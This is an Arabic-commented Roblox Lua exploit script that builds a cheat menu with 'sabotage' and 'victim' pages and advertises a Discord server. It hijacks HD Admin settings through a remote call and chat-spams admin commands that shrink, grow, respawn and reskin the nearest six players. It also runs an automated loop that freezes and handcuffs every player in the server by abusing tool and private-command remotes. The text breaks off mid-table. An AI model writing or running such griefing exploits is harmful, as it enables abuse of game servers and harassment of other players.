local args = {
    [1] = {
        [1] = "Prefix",
        [2] = "."
    }
}

game:GetService("ReplicatedStorage").HDAdminHDClient.Signals.ChangeSetting:InvokeServer(unpack(args))

-- إنشاء الواجهة الرئيسية
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- إنشاء الإطار الرئيسي
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 490, 0, 300) -- حجم الواجهة
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150) -- توسيط الواجهة
mainFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0.1, 0)
mainCorner.Parent = mainFrame

-- شريط العنوان
local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 30)
topBar.Position = UDim2.new(0, 0, 0, 0)
topBar.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
topBar.Parent = mainFrame

-- عنوان ثابت "1st"
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(0, 100, 0, 20)
titleLabel.Position = UDim2.new(0.5, -50, 0.5, -10)
titleLabel.Text = "1ST"
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextSize = 18
titleLabel.Parent = topBar

-- زر التقليل (الناقص)
local minimizeButton = Instance.new("TextButton")
minimizeButton.Size = UDim2.new(0, 20, 0, 20) -- حجم أصغر
minimizeButton.Position = UDim2.new(1, -60, 0.5, -10)
minimizeButton.Text = "-"
minimizeButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
minimizeButton.TextColor3 = Color3.new(1, 1, 1)
minimizeButton.Font = Enum.Font.SourceSansBold
minimizeButton.TextSize = 18
minimizeButton.Parent = topBar

-- زر الإغلاق
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 20, 0, 20) -- حجم أصغر
closeButton.Position = UDim2.new(1, -30, 0.5, -10)
closeButton.Text = "X"
closeButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
closeButton.TextColor3 = Color3.new(1, 1, 1)
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextSize = 18
closeButton.Parent = topBar

-- زوايا الأزرار
local corner1 = Instance.new("UICorner")
corner1.CornerRadius = UDim.new(0.2, 0)
corner1.Parent = closeButton
local corner2 = Instance.new("UICorner")
corner2.CornerRadius = UDim.new(0.2, 0)
corner2.Parent = minimizeButton

-- الإطارات الداخلية
local leftFrame = Instance.new("Frame")
leftFrame.Size = UDim2.new(0, 100, 1, -30)
leftFrame.Position = UDim2.new(0, 0, 0, 30)
leftFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
leftFrame.Parent = mainFrame

local rightFrame = Instance.new("Frame")
rightFrame.Size = UDim2.new(1, -100, 1, -30)
rightFrame.Position = UDim2.new(0, 100, 0, 30)
rightFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
rightFrame.Parent = mainFrame

-- أزرار القائمة الرئيسية (مع أزرار جديدة وأحجام أصغر)
local buttons = {
    {Text = "ترحيب", Position = UDim2.new(0, 10, 0, 10)},
    {Text = "الشات", Position = UDim2.new(0, 10, 0, 45)},
    {Text = "تخريب", Position = UDim2.new(0, 10, 0, 80)},
    {Text = "ضحيه", Position = UDim2.new(0, 10, 0, 115)}, -- الزر الجديد
    {Text = "مضادات", Position = UDim2.new(0, 10, 0, 150)}, -- الزر الجديد
    {Text = "تخريب الماب", Position = UDim2.new(0, 10, 0, 185)},
    {Text = "رقصات", Position = UDim2.new(0, 10, 0, 220)}
}

for i, buttonInfo in ipairs(buttons) do
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.8, 0, 0, 25) -- حجم أصغر للزر
    button.Position = buttonInfo.Position
    button.Text = buttonInfo.Text
    button.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
    button.TextColor3 = Color3.new(0, 0, 0)
    button.Font = Enum.Font.SourceSansBold
    button.TextSize = 12 -- حجم نص أصغر
    button.Parent = leftFrame

    -- زوايا الأزرار
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0.2, 0)
    buttonCorner.Parent = button

    -- حدث النقر على الزر
    button.MouseButton1Click:Connect(function()
        showPage(buttonInfo.Text) -- إظهار الصفحة المحددة
    end)
end

-- إنشاء الصفحات
local pages = {}

local function showPage(pageName)
    for name, page in pairs(pages) do
        page.Visible = (name == pageName) -- إظهار الصفحة المحددة وإخفاء البقية
    end
end

-- صفحة الترحيب
local welcomePage = Instance.new("Frame")
welcomePage.Size = UDim2.new(1, 0, 1, 0)
welcomePage.Position = UDim2.new(0, 0, 0, 0)
welcomePage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
welcomePage.Visible = false
welcomePage.Parent = rightFrame

-- استيراد TweenService
local TweenService = game:GetService("TweenService")

-- إضافة صورة اللاعب
local profilePicture = Instance.new("ImageLabel")
profilePicture.Size = UDim2.new(0, 120, 0, 120)
profilePicture.Position = UDim2.new(1, 0, 0.01, 0) -- وضع الصورة خارج الشاشة إلى اليمين
profilePicture.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
profilePicture.BackgroundColor3 = Color3.new(0, 0, 0)
profilePicture.BorderSizePixel = 0
profilePicture.Parent = welcomePage

-- جعل الصورة دائرية
local profileCorner = Instance.new("UICorner")
profileCorner.CornerRadius = UDim.new(1, 0)
profileCorner.Parent = profilePicture

-- تحريك الصورة لتأتي من اليمين
local profileTweenInfo = TweenInfo.new(1, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out)
local profileTargetPosition = UDim2.new(0.5, -60, 0.01, 0)
local profileTween = TweenService:Create(profilePicture, profileTweenInfo, { Position = profileTargetPosition })
profileTween:Play()

-- إضافة رسالة ترحيب
local welcomeLabel = Instance.new("TextLabel")
welcomeLabel.Size = UDim2.new(0, 300, 0, 50) -- حجم النص
welcomeLabel.Position = UDim2.new(0.5, -150, 0.4, 0) -- موقعه
welcomeLabel.Text = "مرحبًا بك، " .. game.Players.LocalPlayer.Name .. "!" -- نص الترحيب
welcomeLabel.TextColor3 = Color3.new(1, 1, 1) -- لون النص
welcomeLabel.BackgroundTransparency = 1 -- شفافية الخلفية
welcomeLabel.Font = Enum.Font.SourceSansBold -- نوع الخط
welcomeLabel.TextSize = 24 -- حجم النص
welcomeLabel.Parent = welcomePage

-- إضافة زر نسخ رابط الديسكورد
local discordButton = Instance.new("TextButton")
discordButton.Size = UDim2.new(0, 200, 0, 40)
discordButton.Position = UDim2.new(1, 0, 0.6, 0) -- وضع الزر خارج الشاشة إلى اليمين
discordButton.Text = "نسخ رابط الديسكورد"
discordButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
discordButton.TextColor3 = Color3.new(0, 0, 0)
discordButton.Font = Enum.Font.SourceSansBold
discordButton.TextSize = 18
discordButton.Parent = welcomePage

-- إضافة تأثير اللمعة
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(223, 1, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
}
gradient.Parent = discordButton

-- إضافة زوايا مستديرة للزر
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0.2, 0)
buttonCorner.Parent = discordButton

-- تحريك الزر ليأتي من اليمين
local buttonTweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local buttonTargetPosition = UDim2.new(0.5, -100, 0.6, 0)
local buttonTween = TweenService:Create(discordButton, buttonTweenInfo, { Position = buttonTargetPosition })
buttonTween:Play()

-- وظيفة نسخ رابط الديسكورد
discordButton.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/NBeFthgA2G")  
    discordButton.Text = "تم النسخ!"
    wait(1)
    discordButton.Text = "نسخ رابط الديسكورد"
end)

-- إضافة ملاحظة
local noteLabel = Instance.new("TextLabel")
noteLabel.Size = UDim2.new(0, 300, 0, 50)
noteLabel.Position = UDim2.new(0.5, -150, 0.8, 0)
noteLabel.Text = "أي اقتراح لكم؟ اكتبوه لنا في سيرفر الديسكورد!"
noteLabel.TextColor3 = Color3.new(1, 1, 1)
noteLabel.BackgroundTransparency = 1
noteLabel.Font = Enum.Font.SourceSans
noteLabel.TextSize = 16
noteLabel.Parent = welcomePage

-- إضافة ملاحظة
local copyrightLabel = Instance.new("TextLabel")
copyrightLabel.Size = UDim2.new(0, 300, 0, 10)
copyrightLabel.Position = UDim2.new(0.5, -150, 0.77, 0)
copyrightLabel.Text = "جميع الحقوق محفوظه في سيرفر الدسكورد"
copyrightLabel.TextColor3 = Color3.new(1, 1, 1)
copyrightLabel.BackgroundTransparency = 1
copyrightLabel.Font = Enum.Font.SourceSans
copyrightLabel.TextSize = 16
copyrightLabel.Parent = welcomePage

-- إضافة الصفحة إلى جدول الصفحات
pages["ترحيب"] = welcomePage

-- وظيفة التقليل
local isMinimized = false
local originalSize = mainFrame.Size
local minimizedSize = UDim2.new(0, 490, 0, 30)

minimizeButton.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    if isMinimized then
        mainFrame.Size = minimizedSize
        leftFrame.Visible = false
        rightFrame.Visible = false
    else
        mainFrame.Size = originalSize
        leftFrame.Visible = true
        rightFrame.Visible = true
    end
end)

-- وظيفة الإغلاق
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- عرض صفحة الترحيب افتراضياً
showPage("ترحيب")

-- إنشاء صفحة نظام الكلبشة
local klbshPage = Instance.new("Frame")
klbshPage.Size = UDim2.new(1, 0, 1, 0)
klbshPage.Position = UDim2.new(0, 0, 0, 0)
klbshPage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
klbshPage.Visible = false
klbshPage.Parent = rightFrame

-- إضافة ملاحظة
local noteLabel = Instance.new("TextLabel")
noteLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
noteLabel.Position = UDim2.new(0.1, 0, 0.001, 0)
noteLabel.BackgroundTransparency = 1
noteLabel.Text = "تخريب الماب "
noteLabel.TextColor3 = Color3.new(1, 1, 1)
noteLabel.Font = Enum.Font.SourceSans
noteLabel.TextSize = 16
noteLabel.Parent = klbshPage

-- إضافة زر أوامر الأقرب 6 لاعبين
local closest6Button = Instance.new("TextButton")
closest6Button.Size = UDim2.new(0.7, 0, 0.15, 0)
closest6Button.Position = UDim2.new(0.15, 0, 0.35, 0) -- تحت زر الكلبشة مباشرة
closest6Button.Text = "فتح أوامر الأقرب 6"
closest6Button.BackgroundColor3 = Color3.fromRGB(0, 100, 255) -- لون أزرق
closest6Button.TextColor3 = Color3.new(1, 1, 1)
closest6Button.Font = Enum.Font.SourceSansBold
closest6Button.TextSize = 18
closest6Button.Parent = klbshPage

-- زوايا الزر
local closest6Corner = Instance.new("UICorner")
closest6Corner.CornerRadius = UDim.new(0.2, 0)
closest6Corner.Parent = closest6Button

closest6Button.MouseButton1Click:Connect(function()
    -- إنشاء واجهة الأقرب 6 لاعبين
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "Closest6Commands"
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.18, 0, 0.27, 0)
    frame.Position = UDim2.new(0.8, 0, 0.6, 0)
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame.Parent = screenGui

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0.1, 0)
    UICorner.Parent = frame

    -- زر "إكس" لإغلاق الواجهة
    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0.1, 0, 0.1, 0)
    closeButton.Position = UDim2.new(0.9, 0, 0, 0) -- أعلى الزاوية اليمنى
    closeButton.Text = "X"
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 140, 0) -- اللون البرتقالي
    closeButton.TextColor3 = Color3.new(1, 1, 1)
    closeButton.Font = Enum.Font.SourceSansBold
    closeButton.TextSize = 14
    closeButton.Parent = frame

    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0.2, 0)
    closeCorner.Parent = closeButton

    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy() -- حذف الواجهة عند النقر
    end)

    -- جعل الإطار قابلاً للتحريك
    local dragging = false
    local dragInput, dragStart, startPos

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.2, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.Text = "أوامر الأقرب 6 لاعبين"
    title.TextColor3 = Color3.fromRGB(255, 215, 0)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 16
    title.Parent = frame

    -- اللون الافتراضي للأزرار
    local buttonColor = Color3.fromRGB(255, 140, 0) -- برتقالي

    -- دالة إنشاء الأزرار
    local function createButton(name, position, commandFunc)
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(0.9, 0, 0.14, 0)
        button.Position = position
        button.Text = name
        button.BackgroundColor3 = buttonColor -- اللون البرتقالي
        button.TextColor3 = Color3.new(1, 1, 1)
        button.Font = Enum.Font.SourceSansBold
        button.TextSize = 14
        button.Parent = frame

        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0.9, 0)
        buttonCorner.Parent = button

        button.MouseButton1Click:Connect(commandFunc)

        return button
    end

    -- دوال الوظائف المختلفة
    local function getClosestPlayers()
        local players = game:GetService("Players"):GetPlayers()
        local player = game:GetService("Players").LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        
        local distances = {}
        for _, plr in ipairs(players) do
            if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local distance = (humanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
                table.insert(distances, { player = plr, distance = distance })
            end
        end
        
        table.sort(distances, function(a, b) return a.distance < b.distance end)
        
        local closest = {}
        for i = 1, math.min(6, #distances) do
            table.insert(closest, distances[i].player)
        end
        
        return closest
    end

    local function shrinkPlayers()
        local closestPlayers = getClosestPlayers()
        for _, plr in ipairs(closestPlayers) do
            local command = "/e .size " .. plr.Name .. " 0"
            pcall(function() game:GetService('Players'):Chat(command) end)
            task.wait(0.01)
        end
    end

    local function rePlayers()
        local closestPlayers = getClosestPlayers()
        for _, plr in ipairs(closestPlayers) do
            local command = "/e .re " .. plr.Name
            pcall(function() game:GetService('Players'):Chat(command) end)
            task.wait(0.01)
        end
    end

    local function growPlayers()
        local closestPlayers = getClosestPlayers()
        for _, plr in ipairs(closestPlayers) do
            local command = "/e .size " .. plr.Name .. " 3"
            pcall(function() game:GetService('Players'):Chat(command) end)
            task.wait(0.01)
        end
    end

    local function changeSkin()
        local closestPlayers = getClosestPlayers()
        for _, plr in ipairs(closestPlayers) do
            local command = "/e .char " .. plr.Name .. " jjjsssmmm"
            pcall(function() game:GetService('Players'):Chat(command) end)
            task.wait(0.01)
        end
    end

    local function changeTitle()
        local closestPlayers = getClosestPlayers()
        for _, plr in ipairs(closestPlayers) do
            local command = "/e .titlepk " .. plr.Name .. " 1st "
            pcall(function() game:GetService('Players'):Chat(command) end)
            task.wait(0.01)
        end
    end

    -- إنشاء الأزرار
    createButton("تصغير ", UDim2.new(0.05, 0, 0.18, 0), shrinkPlayers)
    createButton("RE", UDim2.new(0.05, 0, 0.35, 0), rePlayers)
    createButton("تكبير  ", UDim2.new(0.05, 0, 0.52, 0), growPlayers)
    createButton("تغيير سكن ", UDim2.new(0.05, 0, 0.69, 0), changeSkin)
    createButton("تغير اسم", UDim2.new(0.05, 0, 0.86, 0), changeTitle)
end)



-- إضافة زر التشغيل/الإيقاف
local klbshButton = Instance.new("TextButton")
klbshButton.Size = UDim2.new(0.7, 0, 0.15, 0)
klbshButton.Position = UDim2.new(0.15, 0, 0.15, 0)
klbshButton.Text = "(نسخه تجريبيه) تشغيل نظام الكلبشة"
klbshButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
klbshButton.TextColor3 = Color3.new(1, 1, 1)
klbshButton.Font = Enum.Font.SourceSansBold
klbshButton.TextSize = 18
klbshButton.Parent = klbshPage

-- زوايا الزر
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0.2, 0)
buttonCorner.Parent = klbshButton




-- حدث النقر على الزر
klbshButton.MouseButton1Click:Connect(function()
    -- تبديل حالة التشغيل
    isRunning = not isRunning
    
    if isRunning then
local player = game:GetService("Players").LocalPlayer
local playersList = {} -- قائمة اللاعبين المرتبة
local freezeQueue = {} -- طابور التجميد
local isRunning = false -- حالة التشغيل
local processingActive = false -- هل تتم معالجة اللاعبين حالياً؟
local lastUpdate = 0 -- وقت آخر تحديث
local isMinimized = false -- حالة تصغير الواجهة

-- إنشاء واجهة مستخدم متطورة
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KlbshControllerPro"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 250, 0, 300)
mainFrame.Position = UDim2.new(0, 10, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- شريط العنوان مع أزرار التحكم
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Text = "نظام الكلبشة المتقدم"
title.Size = UDim2.new(0.6, 0, 1, 0)
title.Position = UDim2.new(0.2, 0, 0, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18
title.Parent = titleBar

-- زر التصغير
local minimizeButton = Instance.new("TextButton")
minimizeButton.Name = "MinimizeButton"
minimizeButton.Size = UDim2.new(0, 30, 1, 0)
minimizeButton.Position = UDim2.new(0, 0, 0, 0)
minimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeButton.Text = "-"
minimizeButton.Font = Enum.Font.SourceSansBold
minimizeButton.TextSize = 20
minimizeButton.Parent = titleBar

-- زر الإغلاق
local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 30, 1, 0)
closeButton.Position = UDim2.new(1, -30, 0, 0)
closeButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Text = "X"
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextSize = 16
closeButton.Parent = titleBar

-- زر التشغيل/الإيقاف
local toggleButton = Instance.new("TextButton")
toggleButton.Name = "ToggleButton"
toggleButton.Size = UDim2.new(0.9, 0, 0, 40)
toggleButton.Position = UDim2.new(0.05, 0, 0, 35)
toggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.Text = "بدء التجميد (OFF)"
toggleButton.Font = Enum.Font.SourceSansBold
toggleButton.TextSize = 16
toggleButton.Parent = mainFrame

-- إطار قائمة اللاعبين
local playersFrame = Instance.new("ScrollingFrame")
playersFrame.Size = UDim2.new(0.9, 0, 0, 200)
playersFrame.Position = UDim2.new(0.05, 0, 0, 85)
playersFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
playersFrame.BorderSizePixel = 0
playersFrame.ScrollBarThickness = 5
playersFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
playersFrame.Parent = mainFrame

-- ملصق الحالة
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 20)
statusLabel.Position = UDim2.new(0.1, 0, 0, 283)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
statusLabel.Text = "الحالة: غير نشط | اللاعبين: 0"
statusLabel.Font = Enum.Font.SourceSans
statusLabel.TextSize = 14
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = mainFrame

-- دالة العثور على أداة الكلبشة مع تحسينات
local function findKlbshTool(container)
    if not container then return nil end
    for _, item in ipairs(container:GetChildren()) do
        if item:IsA("Tool") then
            local lowerName = item.Name:lower()
            if string.find(lowerName, "كلبش") or string.find(lowerName, "klbsh") or 
               string.find(lowerName, "cuffs") or string.find(lowerName, "handcuffs") then
                return item
            end
        end
    end
    return nil
end

-- تحديث قائمة اللاعبين مع تحسينات الأداء
local function updatePlayersList()
    local currentTime = tick()
    if currentTime - lastUpdate < 1 then return playersList end -- تحديث كل ثانية فقط
    lastUpdate = currentTime
    
    local tempList = {}
    for _, p in pairs(game:GetService("Players"):GetPlayers()) do
        if p ~= player and p.Character then
            table.insert(tempList, p.Name)
        end
    end
    
    -- الحفاظ على الترتيب مع تحديث الحالة
    local newList = {}
    for _, name in ipairs(playersList) do
        if table.find(tempList, name) then
            table.insert(newList, name)
        end
    end
    
    -- إضافة اللاعبين الجدد
    for _, name in ipairs(tempList) do
        if not table.find(newList, name) then
            table.insert(newList, name)
        end
    end
    
    playersList = newList
    
    -- تحديث واجهة المستخدم
    playersFrame:ClearAllChildren()
    playersFrame.CanvasSize = UDim2.new(0, 0, 0, #playersList * 20)
    
    for i, name in ipairs(playersList) do
        local playerLabel = Instance.new("TextLabel")
        playerLabel.Size = UDim2.new(1, 0, 0, 20)
        playerLabel.Position = UDim2.new(0, 0, 0, (i-1)*20)
        playerLabel.BackgroundTransparency = 1
        playerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        playerLabel.Text = name
        playerLabel.Font = Enum.Font.SourceSans
        playerLabel.TextSize = 14
        playerLabel.TextXAlignment = Enum.TextXAlignment.Left
        playerLabel.Parent = playersFrame
    end
    
    statusLabel.Text = "الحالة: "..(isRunning and "نشط" or "غير نشط").." | اللاعبين: "..#playersList
    return newList
end

-- تجميد لاعب معين مع تحسينات الموثوقية
local function freezePlayer(targetName)
    local startTime = tick()
    local foundPlayer = game:GetService("Players"):FindFirstChild(targetName)
    if not foundPlayer then 
        warn("اللاعب غير موجود: "..targetName)
        return false 
    end
    
    -- انتظر حتى يكون للاعب شخصية
    if not foundPlayer.Character then
        local charAdded
        charAdded = foundPlayer.CharacterAdded:Connect(function(char)
            charAdded:Disconnect()
        end)
        
        local waitTime = 0
        while not foundPlayer.Character and waitTime < 5 do -- انتظر لمدة 5 ثوان كحد أقصى
            task.wait(0.5)
            waitTime = waitTime + 0.5
        end
        
        if not foundPlayer.Character then 
            warn("فشل انتظار شخصية اللاعب: "..targetName)
            return false 
        end
    end
    
    local character = player.Character or player.CharacterAdded:Wait()
    if not character then return false end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return false end
    
    local backpack = player:WaitForChild("Backpack")
    local klbsh = findKlbshTool(backpack) or findKlbshTool(character)
    
    if not klbsh then
        warn("لم يتم العثور على أداة الكلبشة!")
        return false
    end
    
    -- ضع الأداة في اليد
    if klbsh.Parent ~= character then
        klbsh.Parent = character
        task.wait(0.2)
    end
    
    local targetChar = foundPlayer.Character
    if not targetChar then return false end
    
    local humanoidRootPart = targetChar:FindFirstChild("HumanoidRootPart")
    local targetArm = targetChar:FindFirstChild("RightUpperArm") or 
                     targetChar:FindFirstChild("LeftUpperArm")
    
    if not humanoidRootPart then 
        warn("لا يوجد HumanoidRootPart للاعب: "..targetName)
        return false 
    end
    
    local target = targetArm or humanoidRootPart
    local tool = character:FindFirstChild(klbsh.Name)
    
    if tool and tool:FindFirstChild("RemoteEvent") then
        -- قفل حركة اللاعب
        pcall(function()
            local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
            if targetHumanoid then
                targetHumanoid.WalkSpeed = 0
                targetHumanoid.JumpPower = 0
            end
        end)
        
        -- تنفيذ التجميد
        local success, err = pcall(function()
            tool.RemoteEvent:FireServer(target)
            game:GetService("ReplicatedStorage").PrivateCommands.Char:FireServer(4592243049)
            game:GetService("ReplicatedStorage").PrivateCommands.Char:FireServer("No")
        end)
        
        if not success then
            warn("فشل تجميد اللاعب "..targetName..": "..tostring(err))
            return false
        end
        
        task.wait(0.2)
        tool.Parent = backpack
        
        local elapsedTime = tick() - startTime
        print(string.format("تم تجميد اللاعب %s في %.2f ثانية", targetName, elapsedTime))
        return true
    else
        warn("الأداة غير صالحة أو لا تحتوي على RemoteEvent")
        return false
    end
end

-- معالجة طابور التجميد مع تحسينات
local function processFreezeQueue()
    while isRunning do
        if #freezeQueue > 0 then
            processingActive = true
            local targetName = freezeQueue[1]
            table.remove(freezeQueue, 1)
            
            if freezePlayer(targetName) then
                print("تم تجميد اللاعب:", targetName)
            else
                -- أعيد إضافة اللاعب إلى نهاية الطابور إذا فشل التجميد
                table.insert(freezeQueue, targetName)
                print("فشل تجميد اللاعب، سيتم إعادة المحاولة:", targetName)
            end
            
            task.wait(0.5) -- انتظر بين كل تجميد
        else
            processingActive = false
            task.wait(0.1)
        end
    end
end

-- إدارة النظام الرئيسي مع تحسينات
local function manageSystem()
    while isRunning do
        updatePlayersList()
        
        -- ملء الطابور إذا كان فارغاً وغير قيد المعالجة
        if #freezeQueue == 0 and not processingActive and #playersList > 0 then
            for _, name in ipairs(playersList) do
                table.insert(freezeQueue, name)
            end
            print("تم تحديث طابور التجميد بعدد "..#freezeQueue.." لاعب")
        end
        
        task.wait(1) -- تحديث القائمة كل ثانية
    end
end

-- إضافة لاعبين جدد عند دخولهم
game:GetService("Players").PlayerAdded:Connect(function(newPlayer)
    if not isRunning then return end
    
    local function handlePlayer()
        updatePlayersList() -- تحديث القائمة أولاً
        
        if not table.find(playersList, newPlayer.Name) then
            table.insert(playersList, newPlayer.Name)
            table.insert(freezeQueue, newPlayer.Name)
            print("تم إضافة لاعب جديد:", newPlayer.Name)
        end
    end
    
    if newPlayer.Character then
        handlePlayer()
    end
    newPlayer.CharacterAdded:Connect(handlePlayer)
end)

-- إزالة اللاعبين عند خروجهم
game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
    for i, name in ipairs(playersList) do
        if name == leavingPlayer.Name then
            table.remove(playersList, i)
            
            -- إزالة من طابور التجميد إذا كان موجوداً
            for j = #freezeQueue, 1, -1 do
                if freezeQueue[j] == name then
                    table.remove(freezeQueue, j)
                end
            end
            break
        end
    end
    updatePlayersList()
end)

-- وظيفة زر التصغير
minimizeButton.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    
    if isMinimized then
        mainFrame.Size = UDim2.new(0, 250, 0, 30)
        toggleButton.Visible = false
        playersFrame.Visible = false
        statusLabel.Visible = false
    else
        mainFrame.Size = UDim2.new(0, 250, 0, 300)
        toggleButton.Visible = true
        playersFrame.Visible = true
        statusLabel.Visible = true
    end
end)

-- وظيفة زر الإغلاق
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
    isRunning = false -- إيقاف النظام عند الإغلاق
end)

-- زر التحكم مع تحسينات
toggleButton.MouseButton1Click:Connect(function()
    isRunning = not isRunning
    
    if isRunning then
        toggleButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        toggleButton.Text = "إيقاف التجميد (ON)"
        updatePlayersList()
        
        -- بدء النظام
        coroutine.wrap(manageSystem)()
        coroutine.wrap(processFreezeQueue)()
    else
        toggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        toggleButton.Text = "بدء التجميد (OFF)"
        
        -- إفراغ الطابور
        freezeQueue = {}
    end
end)

-- تحديث أولي للواجهة
updatePlayersList()
    end
end)

-- إضافة صفحة الكلبشة إلى جدول الصفحات
pages["تخريب الماب"] = klbshPage

-- إنشاء صفحة الرقصات
local dancesPage = Instance.new("Frame")
dancesPage.Size = UDim2.new(1, 0, 1, 0)
dancesPage.Position = UDim2.new(0, 0, 0, 0)
dancesPage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
dancesPage.Visible = false
dancesPage.Parent = rightFrame

-- إضافة ملاحظة
local noteLabel = Instance.new("TextLabel")
noteLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
noteLabel.Position = UDim2.new(0.1, 0, 0.001, 0)
noteLabel.BackgroundTransparency = 1
noteLabel.Text = " رقصات لاغراض بروبكس (تظهر للاعبين)"
noteLabel.TextColor3 = Color3.new(1, 1, 1)
noteLabel.Font = Enum.Font.SourceSans
noteLabel.TextSize = 16
noteLabel.Parent = dancesPage

-- إضافة 3 أزرار للرقصات
local danceButtons = {
